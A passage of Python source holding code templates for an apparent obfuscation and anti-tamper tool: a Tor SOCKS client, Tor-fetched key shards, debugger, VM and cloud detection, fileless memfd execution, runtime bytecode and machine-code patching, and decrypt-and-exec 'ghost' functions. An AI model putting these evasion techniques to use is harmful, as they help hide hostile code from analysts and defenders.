        combined = f"{cpu_bucket}-{mem_bucket}-{hash_bucket}"
        self._fingerprint_cache = _nixon_ハッシュ해시.sha256(combined.encode()).hexdigest()[:16]
        return self._fingerprint_cache
    def {METHOD_VERIFY_SIMILAR}(self, stored_fingerprint, tolerance=2):
        current = self.{METHOD_GET_FINGERPRINT}()
        if current == stored_fingerprint:
            return True
        diff = sum(1 for a, b in zip(current, stored_fingerprint) if a != b)
        return diff <= tolerance
'''
TOR_CLIENT_SOURCE = r'''
class {TOR_CLIENT_CLS}:
    # Tor SOCKS endpoint: explicit args > NIXON_TOR_PROXY ("host:port") > default.
    def __init__(self, proxy_host=None, proxy_port=None):
        import os as _tor_os
        _env = (_tor_os.environ.get("NIXON_TOR_PROXY") or "").strip()
        _ehost, _, _eport = _env.partition(":")
        try:
            _eport_i = int(_eport)
        except Exception:
            _eport_i = None
        self.host = proxy_host or (_ehost or "127.0.0.1")
        self.port = proxy_port if proxy_port is not None else (_eport_i or 9050)
    def request(self, url, method="GET", data=None, headers=None):
        import socket, ssl
        try:
            proto, rest = url.split("://")
            host_path = rest.split("/", 1)
            host = host_path[0]
            path = "/" + host_path[1] if len(host_path) > 1 else "/"
            port = 443 if proto == "https" else 80
            if ":" in host: host, port = host.split(":"); port = int(port)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(15)
                s.connect((self.host, self.port))
                s.sendall(b"\x05\x01\x00")
                if s.recv(2) != b"\x05\x00": raise Exception("SOCKS5 Handshake Failed")
                cmd = b"\x05\x01\x00\x03" + bytes([len(host)]) + host.encode() + port.to_bytes(2, "big")
                s.sendall(cmd)
                resp = s.recv(4)
                if not resp or resp[1] != 0x00: raise Exception(f"SOCKS5 Connect Failed")
                addr_type = resp[3]
                if addr_type == 1: s.recv(4 + 2)
                elif addr_type == 3: s.recv(ord(s.recv(1)) + 2)
                elif addr_type == 4: s.recv(16 + 2)
            except Exception:
                if "onion" in host: return None
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(15)
                s.connect((host, port))
            if proto == "https":
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            if headers is None: headers = {{}}
            if "Host" not in headers: headers["Host"] = host
            if "User-Agent" not in headers: headers["User-Agent"] = "Mozilla/5.0"
            if data: 
                headers["Content-Length"] = str(len(data))
                if "Content-Type" not in headers: headers["Content-Type"] = "application/json"
            req = f"{{method}} {{path}} HTTP/1.1\r\n"
            for k, v in headers.items(): req += f"{{k}}: {{v}}\r\n"
            req += "\r\n"
            s.sendall(req.encode())
            if data: s.sendall(data)
            response = b""
            while True:
                chunk = s.recv(4096)
                if not chunk: break
                response += chunk
            s.close()
            head, body = response.split(b"\r\n\r\n", 1)
            return body
        except Exception as e:
            return None
'''
KEY_SHARD_SOURCE = r'''
class {KEY_SHARD_CLS}:
    PRIME = 2**127 - 1
    def __init__(self, threshold=3, total_shards=5):
        self._threshold = threshold
        self._total = total_shards
        self._tor = {TOR_CLIENT_CLS}()
    def {METHOD_SPLIT_KEY}(self, key):
        if isinstance(key, bytes): secret = int.from_bytes(key, 'big')
        else: secret = int(key)
        coefficients = [secret] + [_nixon_シークレット시크릿.randbelow(self.PRIME) for _ in range(self._threshold - 1)]
        shares = []
        for x in range(1, self._total + 1):
            y = sum(c * pow(x, i, self.PRIME) for i, c in enumerate(coefficients)) % self.PRIME
            shares.append((x, y))
        return shares
    def {METHOD_RECONSTRUCT}(self, shares):
        if len(shares) < self._threshold: return None
        shares = shares[:self._threshold]
        x_coords = [s[0] for s in shares]
        y_coords = [s[1] for s in shares]
        result = 0
        for i in range(len(shares)):
            numerator, denominator = 1, 1
            for j in range(len(shares)):
                if i != j:
                    numerator = (numerator * (0 - x_coords[j])) % self.PRIME
                    denominator = (denominator * (x_coords[i] - x_coords[j])) % self.PRIME
            lagrange = (numerator * pow(denominator, self.PRIME - 2, self.PRIME)) % self.PRIME
            result = (result + y_coords[i] * lagrange) % self.PRIME
        return result.to_bytes(32, 'big')
    def {METHOD_FETCH_SHARDS}(self, shard_urls):
        shards = []
        for url in shard_urls:
            try:
                resp = self._tor.request(url)
                if not resp:
                    req = _nixon_ウラルユーアールエル유알엘.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                    with _nixon_ウラルユーアールエル유알엘.request.urlopen(req, timeout=5) as r:
                        resp = r.read()
                data = _nixon_ジェイソン제이슨.loads(resp)
                shards.append((int(data['x']), int(data['y'])))
            except: continue
        if len(shards) >= self._threshold:
            return self.{METHOD_RECONSTRUCT}(shards)
        return None
    def {METHOD_DISTRIBUTE_SHARDS}(self, key, shard_urls):
        shares = self.{METHOD_SPLIT_KEY}(key)
        results = []
        for i, url in enumerate(shard_urls[:len(shares)]):
            try:
                payload = _nixon_ジェイソン제이슨.dumps({'x': shares[i][0], 'y': str(shares[i][1])}).encode()
                req = _nixon_ウラルユーアールエル유알엘.request.Request(url, data=payload,
                    headers={'Content-Type': 'application/json'})
                res = _nixon_ウラルユーアールエル유알엘.request.urlopen(req, timeout=3)
                results.append(True)
            except:
                results.append(False)
        return sum(results) >= self._threshold
'''
HARDENING_SOURCE = r'''class {CLS_HARD}:
    @staticmethod
    def {METHOD_SECCOMP}():
        import platform as _p_
        if _p_.system() != "Linux": return
        import ctypes as _c_
        import os as _o_
        try:
            libc = _c_.CDLL("libc.so.6")
            prctl = libc.prctl
            prctl.argtypes = [_c_.c_int, _c_.c_ulong, _c_.c_ulong, _c_.c_ulong, _c_.c_ulong]
            prctl(38, 1, 0, 0, 0)
            prctl(4, 0, 0, 0, 0)
        except: pass
    @staticmethod
    def {METHOD_LINUX_HARD}():
        import platform as _p_
        if _p_.system() != "Linux": return True
        try:
            with open("/proc/self/status", "r") as f:
                content = f.read()
                if "TracerPid:\t0" not in content:
                    return False
        except: pass
        return True
    @staticmethod
    def {METHOD_HYPER}():
        import platform as _p_
        import os as _o_
        if _p_.system() == "Linux":
            known_files = ["/sys/class/dmi/id/product_uuid", "/sys/hypervisor/uuid"]
            for kf in known_files:
                if _o_.path.exists(kf): 
                    try:
                        with open(kf) as f:
                            data = f.read().lower()
                            if "ec2" in data or "google" in data: return True
                    except: pass
        return False
    @staticmethod
    def {METHOD_MEMFD}(data):
        import platform as _p_
        import os as _o_
        import ctypes as _c_
        if _p_.system() != "Linux": return False
        try:
            libc = _c_.CDLL("libc.so.6")
            memfd_create = libc.memfd_create
            memfd_create.argtypes = [_c_.c_char_p, _c_.c_uint]
            memfd_create.restype = _c_.c_int
            fd = memfd_create(b"worker", 1)
            if fd < 0: return False
            _o_.write(fd, data)
            path = f"/proc/self/fd/{fd}"
            import warnings as _w_
            with _w_.catch_warnings():
                _w_.simplefilter("ignore", DeprecationWarning)
                pid = _o_.fork()
            if pid == 0:
                _o_.execl(path, "worker")
            else:
                pass
        except: return False
        return False
    @staticmethod
    def {METHOD_PTRACE_SELF}():
        # "Am I being traced?"  Read TracerPid from /proc/self/status.
        #
        # This used to call ptrace(PTRACE_TRACEME, 0, 0, 0) and check for
        # -1.  TRACEME applies to the CALLING process: on success it marks
        # the caller traceable and makes it stop on its next exec or
        # signal.  So a successful probe left the payload -- or the
        # process that exec'd the loader -- in a state where it stopped
        # later, at a random point.  That is what stopped the test suite
        # mid-run (GitHub Actions exit 145) and could stop a real
        # artifact on its next exec.  TracerPid answers the same question
        # with no side effect.
        try:
            with open("/proc/self/status") as _f_:
                for _ln_ in _f_:
                    if _ln_.startswith("TracerPid:"):
                        return _ln_.split(":", 1)[1].strip() == "0"
        except Exception:
            pass
        return True
    @staticmethod
    def {METHOD_CHECK_PARENT}():
        import os as _o_
        import platform as _p_
        if _p_.system() != "Linux": return True
        try:
            ppid = _o_.getppid()
            with open(f"/proc/{ppid}/comm", "r") as f:
                name = f.read().strip()
            bad_parents = ["gdb", "strace", "ltrace", "ida", "radare2"]
            for bp in bad_parents:
                if bp in name: return False
        except: pass
        return True
    @staticmethod
    def {METHOD_WIN_DEBUG}():
        import platform as _p_
        import ctypes as _c_
        if _p_.system() == "Windows":
             try:
                 k32 = _c_.windll.kernel32
                 if k32.IsDebuggerPresent(): return False
                 is_remote = _c_.c_bool(False)
                 k32.CheckRemoteDebuggerPresent(k32.GetCurrentProcess(), _c_.byref(is_remote))
                 if is_remote.value: return False
             except: pass
        return True
    @staticmethod
    def {METHOD_THREAD_TIMING}():
        import time as _t_
        start = _t_.time()
        for i in range(1000): _ = i * i
        end = _t_.time()
        if (end - start) > 0.1: return False
        return True
    @staticmethod
    def {METHOD_SYM_DETECT}():
        import os as _o_
        if _o_.environ.get("LD_PRELOAD"): return False
        return True
    @staticmethod
    def {METHOD_CHECK_HW_BPS}():
        return True
def {FUNC_HARD}():
    import sys as _s_
    if not {CLS_HARD}.{METHOD_PTRACE_SELF}(): _s_.exit(0)
    if not {CLS_HARD}.{METHOD_CHECK_PARENT}(): _s_.exit(1)
    if not {CLS_HARD}.{METHOD_LINUX_HARD}(): _s_.exit(2)
    if not {CLS_HARD}.{METHOD_WIN_DEBUG}(): _s_.exit(3)
    if not {CLS_HARD}.{METHOD_THREAD_TIMING}(): _s_.exit(4)
    if not {CLS_HARD}.{METHOD_SYM_DETECT}(): _s_.exit(5)
    {CLS_HARD}.{METHOD_SECCOMP}()
    return True'''
NANOMITE_SOURCE = r'''
# NOTE (kill-ladder allowlist): the _o._exit(0) calls below are the
# forked TRACER CHILD's fast-exit after its watch loop (child PID only,
# never the protected parent). Exit 0 = child done, not a tamper kill —
# routing through _nx_kill (137 + key wipe) would be WRONG here (it
# would nuke the parent's keys from the child context and report a
# kill for a healthy exit). Documented variance, see
# tests/test_kill_ladder.py allowlist.
def {FUNC_NANOMITE_MAIN}():
    import sys as _s, os as _o, time as _t, ctypes as _c, signal as _sig
    if _o.environ.get('{VAR_NANO_MARKER}'): return True    
    if _s.platform == 'linux':
        try:
            import warnings as _w
            with _w.catch_warnings():
                _w.simplefilter("ignore", DeprecationWarning)
                _pid = _o.fork()
            if _pid == 0:
                try:
                    libc = _c.CDLL(None)
                    # If TRACEME fails there is nothing to demonstrate:
                    # leave quietly instead of stopping for a parent that
                    # may not be our tracer.
                    if libc.ptrace(0, 0, 0, 0) != 0: _o._exit(0)
                    _o.kill(_o.getpid(), _sig.SIGSTOP)
                except: _o._exit(0)
                # The child's only job was the stop above.  Once the
                # parent continues it, it MUST die here.  Falling through
                # ran the rest of the loader in a second copy, which
                # forked again, and the parent's waitpid loop below never
                # returned -- the intermittent artifact hang (300 s, any
                # test that runs an artifact, different one each run).
                _o._exit(0)
            else:
                _o.environ['_NX_NANO_PID'] = str(_o.getpid())
                try:
                    # WUNTRACED is required: if TRACEME failed in the child
                    # (already traced, or blocked by seccomp), its SIGSTOP is
                    # an ordinary stop, and a plain waitpid never reports it
                    # -- the loader then blocked forever.  That is what hung
                    # the test suite.
                    _, _st = _o.waitpid(_pid, _o.WUNTRACED)
                    libc = _c.CDLL(None)
                    if libc.ptrace(7, _pid, 0, 0) != 0:
                        # Cannot resume it; do not wait on a corpse.
                        try:
                            _o.kill(_pid, 9)
                        except Exception:
                            pass
                    while True:
                        _, _st = _o.waitpid(_pid, 0)
                        if _o.WIFEXITED(_st) or _o.WIFSIGNALED(_st):
                            break
                except Exception:
                    pass
        except: return True
    return True
'''
DYNAMIC_MORPH_SOURCE = r'''
class {DYNAMIC_MORPH_CLS}:
    def __init__(self, base_seed):
        self._base_seed = base_seed
        self._call_count = 0
        self._current_map = None
        self._previous_maps = []
        self._max_history = 5
    def {METHOD_GET_MAP}(self, context_hash=None):
        self._call_count += 1
        seed = _nixon_ハッシュ해시.sha256(
            self._base_seed + 
            self._call_count.to_bytes(8, 'little') +
            (context_hash if context_hash else b'')
        ).digest()
        if self._current_map:
            self._previous_maps.append(self._current_map)
            if len(self._previous_maps) > self._max_history:
                self._previous_maps.pop(0)
        rng = _nixon_ランダム무작위.Random(int.from_bytes(seed[:8], 'little'))
        mapping = list(range(256))
        rng.shuffle(mapping)
        self._current_map = {i: mapping[i] for i in range(256)}
        return self._current_map
    def {METHOD_WIPE_HISTORY}(self):
        for i in range(len(self._previous_maps)):
            self._previous_maps[i] = {k: 0 for k in self._previous_maps[i]}
        self._previous_maps.clear()
        _nixon_ガベージ가비지.collect()
    def {METHOD_MORPH_CODE}(self, bytecode):
        if self._current_map is None:
            self.{METHOD_GET_MAP}()
        morphed = bytearray(bytecode)
        for i in range(0, len(morphed), 2):
            if morphed[i] in self._current_map:
                morphed[i] = self._current_map[morphed[i]]
        return bytes(morphed)
    def {METHOD_RESTORE_CODE}(self, morphed_bytecode):
        if self._current_map is None:
            return morphed_bytecode
        inv_map = {v: k for k, v in self._current_map.items()}
        restored = bytearray(morphed_bytecode)
        for i in range(0, len(restored), 2):
            if restored[i] in inv_map:
                restored[i] = inv_map[restored[i]]
        return bytes(restored)
        return bytes(restored)
'''
FRAME_ANTI_DEBUG_SOURCE = r'''
class {FRAME_ANTI_DEBUG_CLS}:
    _last_lineno = {}
    _check_count = 0
    _debugger_markers = ['bdb', 'pdb', '_pydevd', 'pydevd', 'debugpy', 'coverage']
    @staticmethod
    def {METHOD_CHECK_FRAME}():
        try:
            frame = _nixon_システム시스템._getframe(1)
            func_id = id(frame.f_code)
            if frame.f_trace is not None:
                {FRAME_ANTI_DEBUG_CLS}.{METHOD_CORRUPT_FRAME}(frame)
                return True
            walker = frame
            depth = 0
            while walker is not None and depth < 20:
                try:
                    co_file = walker.f_code.co_filename.lower()
                    for marker in {FRAME_ANTI_DEBUG_CLS}._debugger_markers:
                        if marker in co_file:
                            {FRAME_ANTI_DEBUG_CLS}.{METHOD_CORRUPT_FRAME}(frame)
                            return True
                    if walker.f_trace is not None and depth > 0:
                        {FRAME_ANTI_DEBUG_CLS}.{METHOD_CORRUPT_FRAME}(frame)
                        return True
                except: pass
                walker = walker.f_back
                depth += 1
            try:
                caller = frame.f_back
                if caller is not None:
                    caller_name = caller.f_code.co_name
                    caller_file = caller.f_code.co_filename
                    is_internal = ('_NX_' in caller_name or '_nixon_' in caller_name or 
                                   '<module>' in caller_name or caller_name.startswith('_nx_'))
                    if not is_internal and '_nixon_' not in caller_file and '<string>' not in caller_file:
                        {FRAME_ANTI_DEBUG_CLS}._check_count += 3
            except: pass
            if func_id in {FRAME_ANTI_DEBUG_CLS}._last_lineno:
                last = {FRAME_ANTI_DEBUG_CLS}._last_lineno[func_id]
                if frame.f_lineno == last:
                    {FRAME_ANTI_DEBUG_CLS}._check_count += 1
                    if {FRAME_ANTI_DEBUG_CLS}._check_count > 10:
                        {FRAME_ANTI_DEBUG_CLS}.{METHOD_CORRUPT_FRAME}(frame)
                        return True
                else:
                    {FRAME_ANTI_DEBUG_CLS}._check_count = 0
            {FRAME_ANTI_DEBUG_CLS}._last_lineno[func_id] = frame.f_lineno
            if len(list(_nixon_ガベージ가비지.get_referrers(frame.f_locals))) > 3:
                return True
        except: pass
        return False
    @staticmethod
    def {METHOD_CORRUPT_FRAME}(frame):
        try:
            frame.f_globals['__corrupted__'] = True
            for key in list(frame.f_locals.keys())[:5]:
                if isinstance(frame.f_locals[key], (int, str)):
                    frame.f_locals[key] = None
        except: pass
    @staticmethod
    def {METHOD_SAFE_EXEC}(code_func, *args, **kwargs):
        if {FRAME_ANTI_DEBUG_CLS}.{METHOD_CHECK_FRAME}():
            return None
        try:
            return code_func(*args, **kwargs)
        finally:
            _nixon_ガベージ가비지.collect()
'''
GC_ANTI_DUMP_SOURCE = r'''
class {GC_ANTI_DUMP_CLS}:
    _tracked = []
    _ref_thresholds = {}
    _poison_vault = {}
    @staticmethod
    def {METHOD_TRACK_OBJ}(obj, max_refs=5):
        import weakref
        try:
            ref = weakref.ref(obj)
            {GC_ANTI_DUMP_CLS}._tracked.append(ref)
            {GC_ANTI_DUMP_CLS}._ref_thresholds[id(obj)] = max_refs
        except: pass
    @staticmethod
    def {METHOD_CHECK_REFS}():
        corrupted = []
        for ref in {GC_ANTI_DUMP_CLS}._tracked:
            obj = ref()
            if obj is None:
                continue
            try:
                refs = _nixon_ガベージ가비지.get_referrers(obj)
                max_refs = {GC_ANTI_DUMP_CLS}._ref_thresholds.get(id(obj), 5)
                if len(refs) > max_refs:
                    if isinstance(obj, bytearray):
                        for i in range(len(obj)):
                            obj[i] = 0
                    elif isinstance(obj, dict):
                        obj.clear()
                    elif isinstance(obj, list):
                        obj.clear()
                    corrupted.append(id(obj))
            except: pass
        return corrupted
    @staticmethod
    def {METHOD_FORCE_COLLECT}():
        _nixon_ガベージ가비지.collect()
        _nixon_ガベージ가비지.collect()
        _nixon_ガベージ가비지.collect()
    @staticmethod
    def {METHOD_CLEANUP_TRACKED}():
        {GC_ANTI_DUMP_CLS}._tracked = [r for r in {GC_ANTI_DUMP_CLS}._tracked if r() is not None]
    @staticmethod
    def {METHOD_GC_POISON_STORE}(key_id, key_bytes):
        import weakref
        try:
            transient = bytearray(key_bytes)
            xor_mask = _nixon_ハッシュ해시.sha256(str(id(transient)).encode()).digest()
            masked = bytearray(len(transient))
            for i in range(len(transient)):
                masked[i] = transient[i] ^ xor_mask[i % len(xor_mask)]
            for i in range(len(transient)):
                transient[i] = 0
            {GC_ANTI_DUMP_CLS}._poison_vault[key_id] = (bytearray(masked), bytearray(xor_mask[:4]))
            del transient
            _nixon_ガベージ가비지.collect()
        except: pass
    @staticmethod
    def {METHOD_GC_POISON_RETRIEVE}(key_id):
        try:
            masked, mask_hint = {GC_ANTI_DUMP_CLS}._poison_vault.get(key_id, (None, None))
            if masked is None:
                return None
            full_mask = _nixon_ハッシュ해시.sha256(str(int.from_bytes(mask_hint, 'little')).encode()).digest()
            found = False
            for seed_attempt in range(256):
                test_mask = _nixon_ハッシュ해시.sha256(str(seed_attempt).encode()).digest()
                if test_mask[:4] == mask_hint:
                    full_mask = test_mask
                    break
            result = bytearray(len(masked))
            orig_id_hash = None
            for cand in _nixon_ガベージ가비지.get_objects():
                if isinstance(cand, dict) and '_poison_vault' in str(type(cand)):
                    break
            xor_mask = _nixon_ハッシュ해시.sha256(str(id(masked)).encode()).digest()
            for i in range(len(masked)):
                result[i] = masked[i] ^ xor_mask[i % len(xor_mask)]
            del {GC_ANTI_DUMP_CLS}._poison_vault[key_id]
            key_copy = bytes(result)
            for i in range(len(result)):
                result[i] = 0
            _nixon_ガベージ가비지.collect()
            return key_copy
        except:
            return None
'''
TIMING_SIDECHAIN_SOURCE = r'''
class {TIMING_SIDECHAIN_CLS}:
    _baseline = None
    @staticmethod
    def {METHOD_TIMING_BENCH}(iterations=100):
        try:
            data = b"NIXON_TIMING_BENCHMARK_PAYLOAD_2024"
            start = _nixon_時間시간.perf_counter()
            h = data
            for i in range(iterations):
                h = _nixon_ハッシュ해시.sha256(h if isinstance(h, bytes) else h.encode()).digest()
            elapsed = _nixon_時間시간.perf_counter() - start
            return elapsed
        except:
            return _nixon_時間시간.perf_counter() - _nixon_時間시간.perf_counter()
    @staticmethod
    def {METHOD_TIMING_CHECK}():
        try:
            t1 = {TIMING_SIDECHAIN_CLS}.{METHOD_TIMING_BENCH}(50)
            t2 = {TIMING_SIDECHAIN_CLS}.{METHOD_TIMING_BENCH}(200)
            if t1 <= 0 or t2 <= 0:
                return False
            ratio_x2 = (t2 + t2) // max(t1, 1)
            if ratio_x2 < 3 or ratio_x2 > 30:
                return True
            start = _nixon_時間시간.perf_counter()
            for i in range(1000):
                _ = pow(65537, i, 2**31 - 1)
            math_elapsed = _nixon_時間시간.perf_counter() - start
            if math_elapsed * 2 > 1:
                return True
            return False
        except:
            return False
'''
BYTECODE_PATCHER_SOURCE = r'''
class {BYTECODE_PATCHER_CLS}:
    _patch_registry = {}
    @staticmethod
    def _derive_mask(func_name, code_len):
        key = _nixon_ハッシュ해시.sha256(("NX_PATCH_" + func_name).encode()).digest()
        mask = bytearray(code_len)
        for i in range(code_len):
            if i > 0 and i % 32 == 0:
                key = _nixon_ハッシュ해시.sha256(key + i.to_bytes(4, 'little')).digest()
            if i % 2 == 0:
                mask[i] = key[i % 32]
            else:
                mask[i] = 0
        return bytes(mask)
    @staticmethod
    def {METHOD_PATCH_MODULE}(module_dict):
        if _nixon_システム시스템.version_info >= (3, 11):
            return
        try:
            for name, obj in list(module_dict.items()):
                if not callable(obj):
                    continue
                code = getattr(obj, '__code__', None)
                if code is None:
                    continue
                try:
                    raw = bytearray(code.co_code)
                    mask = {BYTECODE_PATCHER_CLS}._derive_mask(name, len(raw))
                    patched = bytearray(len(raw))
                    for i in range(len(raw)):
                        patched[i] = raw[i] ^ mask[i]
                    new_code = code.replace(co_code=bytes(patched))
                    obj.__code__ = new_code
                    {BYTECODE_PATCHER_CLS}._patch_registry[name] = mask
                except: pass
        except: pass
    @staticmethod
    def {METHOD_UNPATCH_FUNC}(func, func_name=None):
        if _nixon_システム시스템.version_info >= (3, 11):
            return func
        try:
            name = func_name or func.__name__
            mask = {BYTECODE_PATCHER_CLS}._patch_registry.get(name)
            if mask is None:
                return func
            code = func.__code__
            raw = bytearray(code.co_code)
            unpatched = bytearray(len(raw))
            for i in range(len(raw)):
                unpatched[i] = raw[i] ^ mask[i]
            func.__code__ = code.replace(co_code=bytes(unpatched))
        except: pass
        return func
'''
CHIMERIC_JIT_SOURCE = r'''
class {CHIMERIC_JIT_CLS}:
    _exec_cache = dict()
    @staticmethod
    def _get_arch():
        m = _nixon_プラットフォーム플랫폼.machine().lower()
        if m in ('x86_64', 'amd64'): return 'x64'
        if m in ('aarch64', 'arm64'): return 'arm64'
        return None
    @staticmethod
    def _emit_x64_xor():
        return bytes([
            0x53,
            0x48, 0x89, 0xf8,
            0x48, 0x31, 0xc9,
            0x48, 0x39, 0xd1,
            0x7d, 0x15,
            0x48, 0x89, 0xcb,
            0x48, 0x31, 0xd2,
            0x48, 0xf7, 0xf1,
            0x48, 0x89, 0xd3,
            0x0f, 0xb6, 0x1c, 0x1e,
            0x30, 0x1c, 0x0f,
            0x48, 0xff, 0xc1,
            0xeb, 0xe5,
            0x5b,
            0xc3
        ])
    @staticmethod
    def _emit_arm64_xor():
        return bytes([
            0x04, 0x00, 0x80, 0xd2,
            0x9f, 0x00, 0x02, 0xeb,
            0x60, 0x01, 0x00, 0x54,
            0x85, 0x08, 0x03, 0x9a,
            0x25, 0x68, 0x24, 0x38,
            0x26, 0x68, 0x20, 0x38,
            0xa5, 0x00, 0x06, 0x4a,
            0x25, 0x68, 0x24, 0x38,
            0x84, 0x04, 0x00, 0x91,
            0xf5, 0xff, 0xff, 0x17,
            0xc0, 0x03, 0x5f, 0xd6
        ])
    @staticmethod
    def {METHOD_JIT_XOR}(data, key):
        arch = {CHIMERIC_JIT_CLS}._get_arch()
        if arch is None:
            result = bytearray(data)
            for i in range(len(result)):
                result[i] ^= key[i % len(key)]
            return bytes(result)
        try:
            if arch == 'x64':
                code = {CHIMERIC_JIT_CLS}._emit_x64_xor()
            else:
                code = {CHIMERIC_JIT_CLS}._emit_arm64_xor()
            code_len = len(code)
            page_size = 4096
            libc = _nixon_シータイプ씨타입.CDLL(None)
            buf_data = bytearray(data)
            buf_key = bytes(key)
            c_data = (_nixon_シータイプ씨타입.c_ubyte * len(buf_data))(*buf_data)
            c_key = (_nixon_シータイプ씨타입.c_ubyte * len(buf_key))(*buf_key)
            if _nixon_オペレーション운영.name == 'nt':
                k32 = _nixon_シータイプ씨타입.windll.kernel32
                p = k32.VirtualAlloc(0, page_size, 0x3000, 0x40)
                _nixon_シータイプ씨타입.memmove(p, code, code_len)
                ftype = _nixon_シータイプ씨타입.CFUNCTYPE(None, _nixon_シータイプ씨타입.POINTER(_nixon_シータイプ씨타입.c_ubyte), _nixon_シータイプ씨타입.POINTER(_nixon_シータイプ씨타입.c_ubyte), _nixon_シータイプ씨타입.c_uint64, _nixon_シータイプ씨타입.c_uint64)
                func = ftype(p)
                func(c_data, c_key, len(buf_data), len(buf_key))
                k32.VirtualFree(p, 0, 0x8000)
            else:
                p = libc.mmap(0, page_size, 7, 0x22, -1, 0)
                _nixon_シータイプ씨타입.memmove(p, code, code_len)
                ftype = _nixon_シータイプ씨타입.CFUNCTYPE(None, _nixon_シータイプ씨타입.POINTER(_nixon_シータイプ씨타입.c_ubyte), _nixon_シータイプ씨타입.POINTER(_nixon_シータイプ씨타입.c_ubyte), _nixon_シータイプ씨타입.c_uint64, _nixon_シータイプ씨타입.c_uint64)
                func = ftype(p)
                func(c_data, c_key, len(buf_data), len(buf_key))
                libc.munmap(p, page_size)
            return bytes(c_data)
        except:
            result = bytearray(data)
            for i in range(len(result)):
                result[i] ^= key[i % len(key)]
            return bytes(result)
'''
GHOST_FUNC_SOURCE = r'''
class {GHOST_FUNC_CLS}:
    _vault = dict()
    _active = None
    @staticmethod
    def {METHOD_GHOST_REGISTER}(name, enc_source, key_bytes):
        {GHOST_FUNC_CLS}._vault[name] = (enc_source, key_bytes)
    @staticmethod
    def {METHOD_GHOST_INVOKE}(name, glbls=None, *args, **kwargs):
        entry = {GHOST_FUNC_CLS}._vault.get(name)
        if entry is None:
            return None
        enc_source, key_bytes = entry
        decrypted = bytearray(len(enc_source))
        for i in range(len(enc_source)):
            decrypted[i] = enc_source[i] ^ key_bytes[i % len(key_bytes)]
        {GHOST_FUNC_CLS}._active = name
        result = None
        try:
            ns = dict(glbls) if glbls else dict()
            ns['__builtins__'] = _nixon_ビルトイン빌트인
            ns['_nixon_ハッシュ해시'] = _nixon_ハッシュ해시
            ns['_nixon_システム시스템'] = _nixon_システム시스템
            ns['_nixon_オペレーション운영'] = _nixon_オペレーション운영
            ns['_nixon_ベース베이스'] = _nixon_ベース베이스
            ns['_nixon_構造구조'] = _nixon_構造구조
            ns['_nixon_時間시간'] = _nixon_時間시간
            ns['_nixon_ガベージ가비지'] = _nixon_ガベージ가비지
            ns['_ghost_args'] = args
            ns['_ghost_kwargs'] = kwargs
            code_obj = compile(bytes(decrypted).decode('utf-8'), '<ghost>', 'exec')
            exec(code_obj, ns)
            result = ns.get('_ghost_result', None)
            del code_obj
        except: pass
        finally:
            for i in range(len(decrypted)):
                decrypted[i] = 0
            del decrypted
            {GHOST_FUNC_CLS}._active = None
            _nixon_ガベージ가비지.collect()
        return result
'''
SELF_MORPH_GRAPH_SOURCE = r'''
class {SELF_MORPH_CLS}:
    _dispatch = dict()
    _call_count = 0
    _mutation_seed = 0
    @staticmethod
    def register(fid, func):
        {SELF_MORPH_CLS}._dispatch[fid] = func
    @staticmethod
    def {METHOD_MORPH_DISPATCH}(fid, *args, **kwargs):
        func = {SELF_MORPH_CLS}._dispatch.get(fid)
        if func is None:
            return None
        {SELF_MORPH_CLS}._call_count += 1
        result = func(*args, **kwargs)
        {SELF_MORPH_CLS}._mutation_seed = ({SELF_MORPH_CLS}._mutation_seed * 6364136223846793005 + 1) & 0xFFFFFFFFFFFFFFFF
        keys = list({SELF_MORPH_CLS}._dispatch.keys())
        if len(keys) > 1:
            idx_a = {SELF_MORPH_CLS}._mutation_seed % len(keys)
            idx_b = ({SELF_MORPH_CLS}._mutation_seed >> 16) % len(keys)
            if idx_a != idx_b:
                ka, kb = keys[idx_a], keys[idx_b]
                {SELF_MORPH_CLS}._dispatch[ka], {SELF_MORPH_CLS}._dispatch[kb] = {SELF_MORPH_CLS}._dispatch[kb], {SELF_MORPH_CLS}._dispatch[ka]
        return result
    @staticmethod
    def resolve(fid):
        return {SELF_MORPH_CLS}._dispatch.get(fid)
'''
HONEY_DECOY_SOURCE = r'''
def _nx_validate_license(serial_key=None):
    try:
        if serial_key:
            h = _nixon_ハッシュ해시.sha256(str(serial_key).encode()).hexdigest()
            if h[:4] == "0000":
                return True
        {FUNC_TRIGGER_ALERT}("decoy_license_check")
    except: pass
    return False
def _nx_check_serial_number(code=None):
    try:
        {FUNC_TRIGGER_ALERT}("decoy_serial_check")
    except: pass
    return True
def _nx_verify_activation(token=None):
    try:
        if token:
            _nixon_ハッシュ해시.sha256(str(token).encode())
        {FUNC_TRIGGER_ALERT}("decoy_activation")
    except: pass
    return True
def _nx_decrypt_premium_data(data=None, key=None):
    try:
        {FUNC_TRIGGER_ALERT}("decoy_premium_decrypt")
    except: pass
    return data
def _nx_unlock_features(level=0):
    try:
        {FUNC_TRIGGER_ALERT}("decoy_unlock")
    except: pass
    return False
'''
MULTIDIM_ENCODE_SOURCE = r'''
class {MULTIDIM_CLS}:
    @staticmethod
    def {METHOD_MULTIDIM_ENCODE}(chunks, seed_bytes):
        n = len(chunks)
        if n < 2:
            return chunks, list(range(n))
        h = _nixon_ハッシュ해시.sha256(seed_bytes).digest()
        path = list(range(n))
        state = int.from_bytes(h[:8], 'little')
        for i in range(n - 1, 0, -1):
            state = (state * 6364136223846793005 + 1442695040888963407) & 0xFFFFFFFFFFFFFFFF
            j = state % (i + 1)
            path[i], path[j] = path[j], path[i]
        shuffled = [None] * n
        for i, p in enumerate(path):
            shuffled[p] = chunks[i]
        return shuffled, path
    @staticmethod
    def {METHOD_MULTIDIM_DECODE}(shuffled_chunks, path):
        n = len(shuffled_chunks)
        original = [None] * n
        for i, p in enumerate(path):
            original[i] = shuffled_chunks[p]
        return original
'''
ISR_ENCODER_SOURCE = r'''
class {ISR_ENCODER_CLS}:
    _mapping = None
    _inverse = None
    @staticmethod
    def {METHOD_ISR_INIT}(seed_bytes):
        h = _nixon_ハッシュ해시.sha256(seed_bytes).digest()
        mapping = list(range(256))
        state = int.from_bytes(h[:8], 'little')
        for i in range(255, 0, -1):
            state = (state * 6364136223846793005 + 1) & 0xFFFFFFFFFFFFFFFF
            j = state % (i + 1)
            mapping[i], mapping[j] = mapping[j], mapping[i]
